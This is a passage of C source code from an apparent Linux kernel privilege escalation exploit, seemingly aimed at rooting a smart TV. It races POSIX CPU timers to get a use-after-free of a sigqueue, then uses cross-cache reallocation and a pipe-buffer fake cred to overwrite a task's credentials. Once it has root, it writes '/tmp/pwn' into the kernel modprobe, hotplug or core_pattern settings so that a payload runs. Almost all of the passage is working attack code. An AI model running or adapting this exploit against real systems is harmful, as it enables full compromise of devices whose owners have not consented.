        realloc_evt.sigev_signo = SIGUSR2;
        realloc_evt._sigev_un._tid = (pid_t)syscall(SYS_gettid);
        // realloc_evt.sigev_value.sival_ptr = (void *)0x4141414141414141uLL; // For debugging
        
        // Create SIGUSR2 sfd, and block SIGUSR2 and SIGRTMIN+1 and SIGRTMIN+2 on this process.
        sigset_t block_mask;
        sigemptyset(&block_mask);
        sigaddset(&block_mask, SIGUSR2);
        int sigusr2_sfd = SYSCHK(signalfd(-1, &block_mask, SFD_CLOEXEC | SFD_NONBLOCK));\
        sigaddset(&block_mask, SIGRTMIN+1);
        sigaddset(&block_mask, SIGRTMIN+2);
        SYSCHK(sigprocmask(SIG_BLOCK, &block_mask, NULL));
        
        // itimerspec that fires the time immediately when used with `TIMER_ABSTIME`.
        struct itimerspec fire_ts = {0};
        fire_ts.it_value.tv_nsec = 1;

        int parent_settime_delay = PARENT_SETTIME_DELAY_US;
        // int parent_settime_delay = 200 * 1000; // KERNEL PATCH: 200ms delay

        // Prepare the preallocs for cross-cache for parent process
        // NOTE: Must be on CPU 3!
        pin_on_cpu(3);
        sigqueue_crosscache_preallocs();
        pin_on_cpu(0);

        // On a different CPU to the cross-cache CPUs, enqueue a `SIGRTMIN+2` signal.
        // This is used later to leak the task pending list address.
        pid_t my_pid = (pid_t)syscall(SYS_gettid);
        SYSCHK(syscall(__NR_tkill, my_pid, SIGRTMIN+2));

        printf("[*] Racing...\n");
        fflush(stdout);
        
        int attempt = 0;
        while (1) {
            attempt++;
            // Progress update every 100 attempts
            if (attempt % 100 == 0) {
                printf("[*] Attempt %d...\n", attempt);
                fflush(stdout);
            }
            
            // Initially pin to CPU 0
            pin_on_cpu(0);

            // Reset `realloc_timer` on each try.
            realloc_timer = (void *) -1;

            // Receive child process's RACER thread's TID for reaping later
            SYSCHK(read(exploit_child_to_parent[0], &racer_tid, sizeof(pid_t))); // sync 1

            // Attach to the RACER thread and continue it
            SYSCHK(ptrace(PTRACE_ATTACH, racer_tid, NULL, NULL));
            SYSCHK(waitpid(racer_tid, NULL, __WALL));
            SYSCHK(ptrace(PTRACE_CONT, racer_tid, NULL, NULL));

            // Signal to child that we attached and continued
            SYSCHK(write(exploit_parent_to_child[1], &m, 1)); // sync 2

            // Reap the RACER thread.
            //
            // At this point, this should block while the RACER thread is consuming CPU
            // time. There are three possible outcomes:
            //
            // 1. If the RACER thread exits and enters `handle_posix_cpu_timers()` AFTER
            //    `do_exit() -> exit_notify()` has woken us up. `waitpid()` will reap the
            //    RACER thread at that point and allow the timer to be freed.
            //
            // 2. If the RACER thread fires timers too early, then we'll just wake up
            //    after the race window is completely gone.
            //
            // 3. If the RACER thread never fires the timers, we'll also return after the
            //    race window is completely gone.
            SYSCHK(waitpid(racer_tid, NULL, __WALL));

            // Assume we won the race for now. Only the child process can tell us for sure.
            // Child process will be waiting for us to let it know after `waitpid()` returns.
            SYSCHK(write(exploit_parent_to_child[1], &m, 1)); // sync 3

            // Child process `free_func()` thread lets us know when it freed the UAF timer so
            // we can re-allocate it.
            //
            // Ensure to switch to CPU 3 before re-allocating.
            pin_on_cpu(3);
            SYSCHK(read(exploit_child_to_parent[0], &m, 1)); // sync 4

            // Either `free_func()` sends us SUCCESS, or the child process main thread sends us FAIL.
            // In the success case, we are potentially in the race window with a freed timer.
            if (m == SUCCESS_CHAR) {
                // At this point, we know that the timers fired, because the SUCCESS_STR is only
                // sent by the `free_func()` thread.
                //
                // But we don't know if we won the 1st race or not.
                //
                // In any case, we re-allocate the UAF timer now, because it prevents hitting the
                // `BUG_ON` in `send_sigqueue()` if the timer was actually freed.
                SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &realloc_evt, &realloc_timer));
                
                // If we assume we won the race, now `realloc_timer->sigq` is the same as `uaf_timer->sigq`, 
                // and `uaf_timer` is currently being handled by `handle_posix_cpu_timers()` via RACER thread.
                //
                // We want to wait a certain amount of time to let the RACER thread enter `send_sigqueue()`
                // with the `uaf_timer->sigq`, and go past the `!list_empty()` check.
                usleep(parent_settime_delay);

                // Once past the `!list_empty()` check in `send_sigqueue()`, 
                // the `signalfd_notify()` is going to extend the 2nd race window for us.
                //
                // In that 2nd race window, use `timer_settime()` to fire the realloc timer immediately
                // by setting the time in the past, and using `TIMER_ABSTIME`.
                //
                // If we time it just right, the RACER thread's `send_sigqueue()` will be past the
                // `!list_empty()` check, and we'll also get past the check before either thread is
                // able to insert the `sigqueue` into the target task's pending list.
                //
                // At this point, if all of it lined up, this same `sigqueue` will be inserted into both
                // parent and child's pending lists at the same time.
                SYSCHK(timer_settime(realloc_timer, TIMER_ABSTIME, &fire_ts, NULL));

                // The child process will tell us whether it received SIGUSR2 or not. This
                // is how we know whether we won the first race or not.
                SYSCHK(read(exploit_child_to_parent[0], &m, 1)); // sync 5

                // If the child tells us that it didn't receive SIGUSR2, then there are two
                // situations:
                //
                // 1. We lost the 1st race, so the child received NUM_TIMERS+1 SIGUSR1 signals. This
                //    means the child never could have seen the SIGUSR2 signal.
                // 2. We won the 1st race, but the didn't win the 2nd race. This means the child could
                //    have seen the SIGUSR2 signal, but since it says it didn't, it means our timer
                //    fired too early.
                //
                // In the 2nd case, the signal's `overrun` field will be set to 1.
                if (m == FAIL_CHAR) {
                    // NOTE: no need to poll here, because we'll have the signal here for sure.
                    // After all, we fired it didn't we? :p
                    struct signalfd_siginfo si;
                    SYSCHK(read(sigusr2_sfd, &si, sizeof(si)));

                    // Check for the 2nd case above, did the child receive the SIGUSR2 signal
                    // after it was already queued into our pending list?
                    if (si.ssi_overrun > 0) {
                        // We queued the SIGUSR2 too early into our pending list, so
                        // increase the `timer_settime()` delay for next time.
                        printf("\t[+] Parent raced too early, readjusting...\n");
                        parent_settime_delay += PARENT_SETTIME_DELAY_US_DELTA;
                    } else {
                        // 1st case above, reallocation just failed completely. We
                        // don't need to do anything.
                    }
                } else {
                    // The child was able to observe the SIGUSR2 signal, which means we won the
                    // first race and successfully reallocated the `sigqueue` of the UAF timer.
                    //
                    // Now, since the child saw the SIGUSR2 signal, we have to check to see if
                    // we see the signal too (i.e double insertion check).
                    struct pollfd pfd = { 
                        .fd = sigusr2_sfd,
                        .events = POLLIN
                    };

                    int ret = poll(&pfd, 1, 1);

                    if (ret < 0) {
                        // Some unknown error, pause to debug it.
                        perror("Exploit success path poll");
                        getchar();
                    } else if (pfd.revents & POLLIN) {
                        // We got the SIGUSR2 signal too, which means we won both races.
                        // First, let the child know that we succeeded.
                        SYSCHK(write(exploit_parent_to_child[1], SUCCESS_STR, 1)); // sync 6.SUCCESS

                        // SUCCESS_COMMENT:
                        // UAF sigqueue is now in both process's pending list, but we don't
                        // know which list the UAF sigqueue's list is pointing to. 
                        // 
                        // This matters because when we dequeue this signal from the 
                        // pending list, two things will happen:
                        //
                        // 1. The sigqueue will be removed from the list that it *thinks*
                        //    it's in.
                        // 2. The other list will still point to the `sigqueue`, but the
                        //    `sigqueue` itself is considered "empty" and thus cannot ever
                        //    be removed from that other list.
                        //
                        // We need to know which list the sigqueue *thinks* it's in, so we can
                        // continuously dequeue it later as much as we want through the other
                        // list (after all, that's the only primitive we have, since only the 
                        // task pending list has a reference to this UAF sigqueue).
                        //
                        // To figure this out, first delete the timer, so that dequeueing the
                        // UAF sigqueue later will free it.
                        SYSCHK(timer_delete(realloc_timer));
                        
                        // Now, dequeue the UAF sigqueue. It doesn't matter that we dequeue
                        // it from the parent process, because the UAF sigqueue's own list
                        // pointers determines which list it's going to be removed from.
                        struct signalfd_siginfo si;
                        SYSCHK(read(sigusr2_sfd, &si, sizeof(si)));

                        // At this point, two cases:
                        //
                        // 1. If the UAF sigqueue's list pointers pointed to the parent's list,
                        //    then polling here should timeout and not return any pending
                        //    signals (as we just removed it).
                        // 2. If it pointed to the child's list, polling here will still
                        //    return the signal, because the parent still points to it.
                        int ret = poll(&pfd, 1, 1);

                        if (ret > 0 && (pfd.revents & POLLIN)) {
                            // We have the infinitely looping sigqueue in our pending list.
                            // Let the child know via the fail string because we won.
                            SYSCHK(write(exploit_parent_to_child[1], FAIL_STR, 1)); // sync 7.FAIL

                            // Mark this parent as being the owner of the UAF sigqueue.
                            parent_owns_uaf_sigqueue = 1;
                            buggy_pid = (pid_t)syscall(SYS_gettid);

                            printf("\t[+] Freed UAF sigqueue in parent process pid %d\n", buggy_pid);

                            // Initiate stage 2
                            second_stage_exploit();

                            SYSCHK(write(exploit_parent_to_child[1], FAIL_STR, 1)); // sync 8.FAIL
                        } else if (!ret) {
                            // Timeout, means the `sigqueue` is in the child's list.
                            // Let the child know via the success string.
                            SYSCHK(write(exploit_parent_to_child[1], SUCCESS_STR, 1)); // sync 7.SUCCESS

                            // Child will let us know when to continue.
                            SYSCHK(read(exploit_child_to_parent[0], &m, 1)); // stage 2 - sync 1

                            second_stage_exploit();
                        } else {
                            // unknown error, just pause to debug it
                            perror("Exploit success path poll 2 unknown error");
                            getchar();
                        }
                    } else if (!ret) {
                        // Timeout case, we didn't receive the SIGUSR2 signal, but the
                        // child told us that it did. This means we won the first race
                        // and successfully reallocated over the UAF timer's sigqueue,
                        // but our `timer_settime()` fired too late.
                        //
                        // Adjust `start_sleep_time` accordingly to run `timer_settime()`
                        // earlier next time.
                        printf("\t[+] Parent raced too late, readjusting...\n");
                        parent_settime_delay -= PARENT_SETTIME_DELAY_US_DELTA;

                        // Let the child know that we failed.
                        SYSCHK(write(exploit_parent_to_child[1], FAIL_STR, 1)); // sync 6.FAIL
                    }
                }
            }

            // Let the child process delete and free the timer, and
            // all threads before retrying.
            SYSCHK(read(exploit_child_to_parent[0], &m, 1)); // sync 9

            // Free `realloc_timer` if it was ever allocated.
            if (realloc_timer != (void *) -1) {
                timer_delete(realloc_timer);
            }
        }
        
        // UNREACHABLE CODE:
        // Wait for child to exit before exiting
        waitpid(pid, NULL, __WALL);
        close(exploit_child_to_parent[0]);
        close(exploit_parent_to_child[1]);
        // exit(0);
    } else {
        // exploit child process
        pin_on_cpu(1);
        close(exploit_child_to_parent[0]);
        close(exploit_parent_to_child[1]);

        exploit_child_pid = (pid_t)syscall(SYS_gettid);

        // Create signalfds, one each for SIGUSR1, SIGUSR2, SIGRTMIN+1, and SIGRTMIN+2.
        sigset_t block_mask;
        sigemptyset(&block_mask);
        sigaddset(&block_mask, SIGUSR1);
        sigusr1_sfds[0] = SYSCHK(signalfd(-1, &block_mask, SFD_CLOEXEC | SFD_NONBLOCK));
        sigemptyset(&block_mask);
        sigaddset(&block_mask, SIGUSR2);
        sigusr2_sfds[0] = SYSCHK(signalfd(-1, &block_mask, SFD_CLOEXEC | SFD_NONBLOCK));
        sigemptyset(&block_mask);
        sigaddset(&block_mask, SIGRTMIN+1);
        int sigrt1_sfd = SYSCHK(signalfd(-1, &block_mask, SFD_CLOEXEC | SFD_NONBLOCK));
        sigemptyset(&block_mask);
        sigaddset(&block_mask, SIGRTMIN+2);
        int sigrt2_sfd = SYSCHK(signalfd(-1, &block_mask, SFD_CLOEXEC | SFD_NONBLOCK));
        
        // Block all the above signals as well for later
        sigemptyset(&block_mask);
        sigaddset(&block_mask, SIGUSR1);
        sigaddset(&block_mask, SIGUSR2);
        sigaddset(&block_mask, SIGRTMIN+1);
        sigaddset(&block_mask, SIGRTMIN+2);
        sigprocmask(SIG_BLOCK, &block_mask, NULL);

        // Duplicate the SIGUSR1 and SIGUSR2 sfds, and set up epoll
        // watchers on them. In total, 50,000 waitqueue entries will
        // be created.
        //
        // Credit: Jann Horn:
        // https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html
        int epoll_fds[EPOLL_COUNT];

        for (int i = 0; i < EPOLL_COUNT; i++) {
            epoll_fds[i] = SYSCHK(epoll_create1(EPOLL_CLOEXEC));
        }

        // Duplicate sfds, index 0 is the original
        for (int i = 1; i < SFD_DUP_COUNT; i++) {
            sigusr1_sfds[i] = SYSCHK(dup(sigusr1_sfds[0]));
            sigusr2_sfds[i] = SYSCHK(dup(sigusr2_sfds[0]));
        }

        // Setup epoll watchers now
        struct epoll_event ev = {0};
        ev.events = EPOLLIN;

        for (int i = 0; i < EPOLL_COUNT; i++) {
            for (int j = 0; j < SFD_DUP_COUNT; j++) {
                ev.data.fd = sigusr1_sfds[j];
                SYSCHK(epoll_ctl(epoll_fds[i], EPOLL_CTL_ADD, sigusr1_sfds[j], &ev));
                ev.data.fd = sigusr2_sfds[j];
                SYSCHK(epoll_ctl(epoll_fds[i], EPOLL_CTL_ADD, sigusr2_sfds[j], &ev));
            }
        }

        // Waitqueue entries now setup on the signalfds for `signalfd_notify()` in the kernel later.
        prctl(PR_SET_NAME, "EXPLOIT_CHILD");
        pthread_barrier_init(&barrier, NULL, 2);

        // Thread that will handle freeing the UAF timer.
        pthread_t free_timer_thread;

        // On a different CPU to the cross-cache CPUs, enqueue a `SIGRTMIN+2` signal.
        // This is used later to leak the task pending list address.
        pid_t my_pid = (pid_t)syscall(SYS_gettid);
        SYSCHK(syscall(__NR_tkill, my_pid, SIGRTMIN+2));

        while (1) {
            // printf("Try %d\n", race_retry_count+1);

            // Reset `uaf_timer` before every attempt.
            uaf_timer = (void *) -1;

            // Drain signalfds as they could have left over signals from
            // the previous try.
            struct signalfd_siginfo si;
            drain_signalfd(sigusr1_sfds[0]);
            drain_signalfd(sigusr2_sfds[0]);

            // Create the FREE_TIMER and RACER threads
            SYSCHK(pthread_create(&race_thread, NULL, (void*)race_func, NULL));
            SYSCHK(pthread_create(&free_timer_thread, NULL, (void*)free_func, NULL));

            // Parent process writes to us when attached and continued, use
            // a barrier to continue the RACER thread now
            SYSCHK(read(exploit_parent_to_child[0], &m, 1)); // sync 2
            pthread_barrier_wait(&barrier); // barrier 1

            // Wait for timers to be created by RACER thread
            pthread_barrier_wait(&barrier); // barrier 2

            // Arm the timers now, ensuring the first 18 are before the
            // UAF timer
            struct itimerspec ts = {
                .it_interval = {0, 0},
                .it_value = {
                    .tv_sec = 0,
                    .tv_nsec = ONE_MS_NS - 1,
                },
            };
            
            for (int i = 0; i < NUM_TIMERS; i++) {
                SYSCHK(timer_settime(stall_timers[i], 0, &ts, NULL));
            }
            
            // Arm UAF timer as the latest one
            ts.it_value.tv_nsec = ONE_MS_NS;
            SYSCHK(timer_settime(uaf_timer, 0, &ts, NULL));
            
            // Now, let RACER thread continue
            pthread_barrier_wait(&barrier); // barrier 3
            
            // Parent exploit process tells us after `waitpid()` returns.
            SYSCHK(read(exploit_parent_to_child[0], &m, 1)); // sync 3

            // Wait up to 100ms for the any signals to be received
            //
            // NOTE: Depending on how long the race window is, this timeout
            //       may need to be longer. 
            // 
            //       In my case, the race window is 24-30ms long, so 100ms is 
            //       plenty.
            struct pollfd pfds[2] = { 
                { .fd = sigusr1_sfds[0], .events = POLLIN },
                { .fd = sigusr2_sfds[0], .events = POLLIN }, 
            };

            int sigusr1_count = 0;

            // This is unused normally, but can be used with a kernel
            // patch. See below.
            int poll_timeout = 100;

            // Poll for SIGUSR1 and SIGUSR2.
            for (;;) {
                int ret = poll(pfds, 2, poll_timeout);
                if (!ret) { 
                    // Timeout case means one of two things:
                    //
                    // 1. No timers were fired at all.
                    // 2. Timers were fired, but the 2nd race was lost, so
                    //    we didn't see the reallocated timer's SIGUSR2 signal.
                    //
                    // In the first case, `sigusr1_count` will be 0, use that
                    // to know that we should cancel the `free_timer_thread`,
                    // as otherwise it will be running and waiting forever for
                    // a signal.
                    if (!sigusr1_count) {
                        pthread_cancel(free_timer_thread);
                    }

                    // In the 2nd case, we'll hit this timeout only if the parent
                    // process queued the SIGUSR2 signal on itself before we could
                    // enter the 2nd race window (so we failed the `!list_empty()` check).
                    //
                    // This basically means we didn't receive the SIGUSR2 signal, but
                    // also received one less SIGUSR1 signal than we'd expect (because the
                    // UAF timer that was supposed to send us the last SIGUSR1 was reallocated).
                    // 
                    // In this case, the `free_func()` thread will have already exited. We
                    // just let the parent know.
                    //
                    // Note: for the first case above, we also let the parent know. That's why
                    //       this write is marked with sync 4.FAIL and sync 5.FAIL, since it
                    //       handles two separate failure scenarios.
                    SYSCHK(write(exploit_child_to_parent[1], FAIL_STR, 1)); // sync 4.FAIL, 5.FAIL
                    break;
                }
                else if (ret > 0 && (pfds[0].revents & POLLIN)) {
                    // We got SIGUSR1! Timers fired.
                    //
                    // NOTE: free_func drains and timer_deletes immediately (no barrier).
                    // We just drain whatever SIGUSR1 signals remain (may be none if
                    // free_func already drained everything).
                    sigusr1_count += drain_signalfd(sigusr1_sfds[0]);

                    // KERNEL PATCH: change timeout to 1s after SIGUSR1 seen, guarantees
                    //               that we win the second race.
                    // poll_timeout = 1000;
                    if (sigusr1_count >= NUM_TIMERS+1) { 
                        // Receiving 19 SIGUSR1 signals means the first race failed,
                        // because the parent process failed to reallocate and change
                        // the UAF timer's signal to SIGUSR2.
                        //
                        // The parent process will be waiting for us to let it know
                        // whether the reallocated timer was able to send us the
                        // SIGUSR2 or not. In this case, we failed.
                        //
                        // Let the parent know and exit this poll loop.
                        SYSCHK(write(exploit_child_to_parent[1], FAIL_STR, 1)); // sync 5.FAIL
                        break;
                    }
                } else if (ret > 0 && (pfds[1].revents & POLLIN)) {
                    // We got SIGUSR2! Race is potentially won, so let's check.
                    // Let parent process know to check for SIGUSR2 signal
                    SYSCHK(write(exploit_child_to_parent[1], SUCCESS_STR, 1)); // sync 5.SUCCESS
                    SYSCHK(read(exploit_parent_to_child[0], &m, 1)); // sync 6

                    if (m == SUCCESS_CHAR) {
                        // For an explanation of the below steps, ctrl+f for
                        // "SUCCESS_COMMENT:" in this exploit. It explains
                        // how to figure out which list the `sigqueue's` next
                        // and prev pointers point to (i.e child or parent process's
                        // pending list).
                        SYSCHK(read(exploit_parent_to_child[0], &m, 1)); // sync 7

                        // Parent tells us whether we have the UAF sigqueue in our pending list or not.
                        if (m == SUCCESS_CHAR) {
                            // We have the signal in our list.
                            //
                            // This is an extremely rare situation, as the race window for this
                            // to occur is so incredibly small.
                            parent_owns_uaf_sigqueue = 0;
                            buggy_pid = (pid_t)syscall(SYS_gettid);

                            printf("\t[+] Freed UAF sigqueue in child process pid %d\n", buggy_pid);
                            printf("\t[+] NOTE: rare path - child owns UAF sigqueue\n");

                            // Tell the parent to continue the exploit now.
                            SYSCHK(write(exploit_child_to_parent[1], SUCCESS_STR, 1)); // stage 2 - sync 1

                            // Parent will tell us to dequeue the SIGRTMIN+2 signal.
                            SYSCHK(read(exploit_parent_to_child[0], &m, 1)); // stage 2 - sync 2

                            // Dequeueing this signal will put the pointer of our task struct's pending list
                            // into the ->prev pointer of the UAF sigqueue.
                            SYSCHK(read(sigrt2_sfd, &si, sizeof(si)));

                            // Let the parent know it can continue
                            SYSCHK(write(exploit_child_to_parent[1], SUCCESS_STR, 1)); // stage 2 - sync 3

                            // Parent will tell us to dequeue the SIGRTMIN+1 signal
                            // (SIGUSR2 is NOT dequeued - kept pending for later!)
                            SYSCHK(read(exploit_parent_to_child[0], &m, 1)); // stage 2 - sync 4

                            // Dequeue the SIGRTMIN+1 signal. This MUST be done on CPU 2 for the
                            // second cross-cache to work.
                            pin_on_cpu(2);
                            SYSCHK(read(sigrt1_sfd, &si, sizeof(si)));
                            pin_on_cpu(1);

                            // Let the parent know it can continue
                            SYSCHK(write(exploit_child_to_parent[1], SUCCESS_STR, 1)); // stage 2 - sync 5

                            // Parent will tell us to dequeue SIGRTMIN+1 again (Stage 3).
                            // This frees the new sigqueue from the cross-cache slab.
                            SYSCHK(read(exploit_parent_to_child[0], &m, 1)); // stage 3 - sync 1
                            pin_on_cpu(2);
                            SYSCHK(read(sigrt1_sfd, &si, sizeof(si)));
                            pin_on_cpu(1);
                            SYSCHK(write(exploit_child_to_parent[1], SUCCESS_STR, 1)); // stage 3 - sync 2

                            // Parent will tell us when to dequeue SIGUSR2 (Stage 5).
                            // By now, the parent has set up the pipe buffer with malicious
                            // list pointers and the fake cred in the second pipe buffer.
                            SYSCHK(read(exploit_parent_to_child[0], &m, 1)); // stage 5 - sync 1

                            // Dequeue SIGUSR2 - this triggers the arbitrary write!
                            // list_del_init: prev->next = next => *task_cred_ptr = fake_cred_addr
                            SYSCHK(read(sigusr2_sfds[0], &si, sizeof(si)));

                            // Check if we got root
                            uid_t euid = geteuid();
                            printf("\t[+] Child EUID after dequeue: %d\n", euid);

                            if (euid == 0) {
                                printf("\t[+] ROOT ACHIEVED in child process!\n");
                                fflush(stdout);
                                int done = 0;
                                int mp_fd = open("/proc/sys/kernel/modprobe", O_WRONLY);
                                if (mp_fd >= 0) {
                                    write(mp_fd, "/tmp/pwn", 8);
                                    close(mp_fd);
                                    socket(44, SOCK_STREAM, 0);
                                    usleep(500000);
                                    done = 1;
                                }
                                if (!done) {
                                    int uh_fd = open("/proc/sys/kernel/hotplug", O_WRONLY);
                                    if (uh_fd >= 0) {
                                        write(uh_fd, "/tmp/pwn", 8);
                                        close(uh_fd);
                                        int ev_fd = open("/sys/class/mem/null/uevent", O_WRONLY);
                                        if (ev_fd >= 0) { write(ev_fd, "add", 3); close(ev_fd); usleep(500000); done = 1; }
                                    }
                                }
                                if (!done) {
                                    int cp_fd = open("/proc/sys/kernel/core_pattern", O_WRONLY);
                                    if (cp_fd >= 0) { write(cp_fd, "|/tmp/pwn", 9); close(cp_fd); }
                                }
                                if (done) {
                                    printf("\t[+] Rooting payload executed!\n");
                                    printf("\t[+] Waiting for /tmp/pwn to finish...\n");
                                    fflush(stdout);
                                    int pwn_done = 0;
                                    for (int i = 0; i < 120 && !pwn_done; i++) {
                                        sleep(1);
                                        int log_fd = open("/tmp/pwn.log", O_RDONLY);
                                        if (log_fd >= 0) {
                                            char logbuf[4096];
                                            int n = read(log_fd, logbuf, sizeof(logbuf) - 1);
                                            close(log_fd);
                                            if (n > 0) {
                                                logbuf[n] = '\0';
                                                if (strstr(logbuf, "done")) {
                                                    printf("\n\t--- /tmp/pwn.log ---\n%s", logbuf);
                                                    printf("\t--- end ---\n\n");
                                                    pwn_done = 1;
                                                }
                                            }
                                        }
                                    }
                                    if (!pwn_done)
                                        printf("\t[!] Timed out waiting for /tmp/pwn (check log manually at /tmp/pwn.log and reboot when ready)\n");
                                    printf("\t[!] Reboot the TV when ready to complete setup.\n");
                                    printf("\t[!] After reboot, Homebrew Channel provides SSH on port 22.\n");
                                }
                                fflush(stdout);
                                for (;;) sleep(3600);
                            }

                            // Let parent know result
                            SYSCHK(write(exploit_child_to_parent[1], SUCCESS_STR, 1)); // stage 5 - sync 2

                            // Block forever
                            SYSCHK(read(exploit_parent_to_child[0], &m, 1));
                        } else {
                            // Parent owns the UAF sigqueue.
                            // After parent's Stage 2 dequeue, the dangling pointer is in our
                            // (child's) pending list. Parent sends SIGRTMIN+1 to us, so we need
                            // to dequeue when parent requests.

                            // Wait for parent's Stage 2 sync 4 (dequeue 1st SIGRTMIN+1)
                            SYSCHK(read(exploit_parent_to_child[0], &m, 1)); // stage 2 - sync 4
                            pin_on_cpu(2);
                            SYSCHK(read(sigrt1_sfd, &si, sizeof(si)));
                            pin_on_cpu(1);
                            SYSCHK(write(exploit_child_to_parent[1], SUCCESS_STR, 1)); // stage 2 - sync 5

                            // Wait for parent's Stage 3 sync 1 (dequeue 2nd SIGRTMIN+1)
                            SYSCHK(read(exploit_parent_to_child[0], &m, 1)); // stage 3 - sync 1
                            pin_on_cpu(2);
                            SYSCHK(read(sigrt1_sfd, &si, sizeof(si)));
                            pin_on_cpu(1);
                            SYSCHK(write(exploit_child_to_parent[1], SUCCESS_STR, 1)); // stage 3 - sync 2

                            // Parent will tell us when to dequeue SIGUSR2 (Stage 5).
                            // By now, the parent has set up the pipe buffer with malicious
                            // list pointers and the fake cred in the second pipe buffer.
                            SYSCHK(read(exploit_parent_to_child[0], &m, 1)); // stage 5 - sync 1

                            // Dequeue SIGUSR2. The kernel traverses child's pending list,
                            // follows the dangling pointer (now pipe buffer with fake data),
                            // and performs list_del_init which writes to task's cred pointer.
                            pin_on_cpu(1);
                            SYSCHK(read(sigusr2_sfds[0], &si, sizeof(si)));

                            // Check if we achieved root
                            uid_t euid = geteuid();
                            printf("\t[DEBUG] Child EUID after dequeue: %d\n", euid);
                            fflush(stdout);

                            if (euid == 0) {
                                printf("\t[+] ROOT ACHIEVED in child process!\n");
                                fflush(stdout);
                                int done = 0;
                                int mp_fd = open("/proc/sys/kernel/modprobe", O_WRONLY);
                                if (mp_fd >= 0) {
                                    write(mp_fd, "/tmp/pwn", 8);
                                    close(mp_fd);
                                    socket(44, SOCK_STREAM, 0);
                                    usleep(500000);
                                    done = 1;
                                }
                                if (!done) {
                                    int uh_fd = open("/proc/sys/kernel/hotplug", O_WRONLY);
                                    if (uh_fd >= 0) {
                                        write(uh_fd, "/tmp/pwn", 8);
                                        close(uh_fd);
                                        int ev_fd = open("/sys/class/mem/null/uevent", O_WRONLY);
                                        if (ev_fd >= 0) { write(ev_fd, "add", 3); close(ev_fd); usleep(500000); done = 1; }
                                    }
                                }
                                if (!done) {
                                    int cp_fd = open("/proc/sys/kernel/core_pattern", O_WRONLY);
                                    if (cp_fd >= 0) { write(cp_fd, "|/tmp/pwn", 9); close(cp_fd); }
                                }
                                if (done) {
                                    printf("\t[+] Rooting payload executed!\n");
                                    printf("\t[+] Waiting for /tmp/pwn to finish...\n");
                                    fflush(stdout);
                                    int pwn_done = 0;
                                    for (int i = 0; i < 120 && !pwn_done; i++) {
                                        sleep(1);
                                        int log_fd = open("/tmp/pwn.log", O_RDONLY);
                                        if (log_fd >= 0) {
                                            char logbuf[4096];
                                            int n = read(log_fd, logbuf, sizeof(logbuf) - 1);
                                            close(log_fd);
                                            if (n > 0) {
                                                logbuf[n] = '\0';
                                                if (strstr(logbuf, "done")) {
                                                    printf("\n\t--- /tmp/pwn.log ---\n%s", logbuf);
                                                    printf("\t--- end ---\n\n");
                                                    pwn_done = 1;
                                                }
                                            }
                                        }
                                    }
                                    if (!pwn_done)
                                        printf("\t[!] Timed out waiting for /tmp/pwn (check log manually at /tmp/pwn.log)\n");
                                    printf("\t[!] Reboot the TV when ready to complete setup.\n");
                                    printf("\t[!] After reboot, Homebrew Channel provides SSH on port 22.\n");
                                }
                                fflush(stdout);
                                for (;;) sleep(3600);
                            }

                            // Let parent know result
                            SYSCHK(write(exploit_child_to_parent[1], SUCCESS_STR, 1)); // stage 5 - sync 2

                            // Block forever
                            SYSCHK(read(exploit_parent_to_child[0], &m, 1));
                        }
                    } else {
                        break; // Failed
                    }
                } else {
                    // error, just pause to debug it
                    printf("poll error in main\n");
                    getchar();
                }
            }

            // If we got here, our current attempt failed. Update `syscall_loop_times`.
            syscall_loop_times++;
            syscall_loop_times %= SYSCALL_LOOP_TIMES_MAX+1;
            race_retry_count++;

            // Free stall timers
            for (int i = 0; i < NUM_TIMERS; i++) {
                timer_delete(stall_timers[i]);
            }

            // Free UAF timer in case it didn't get deleted.
            if (uaf_timer != (void *) -1) {
                timer_delete(uaf_timer);
            }

            // Either the `free_timer_thread` got a signal and exited
            // normally, or it didn't get a signal and we cancelled
            // it in the poll code above. Either way, we can join it.
            SYSCHK(pthread_join(free_timer_thread, NULL));

            // Signal to parent to try again
            SYSCHK(write(exploit_child_to_parent[1], "t", 1)); // sync 9
        }
        
        // UNREACHABLE CODE:
        // Signal to parent to exit
        SYSCHK(write(exploit_child_to_parent[1], "t", 1));

        // Wait for parent to exit
        close(exploit_child_to_parent[1]);
        close(exploit_parent_to_child[0]);

        for (int i = 0; i < SFD_DUP_COUNT; i++) {
            close(sigusr2_sfds[i]);
            close(sigusr1_sfds[i]);
        }
        exit(0);
    }
}
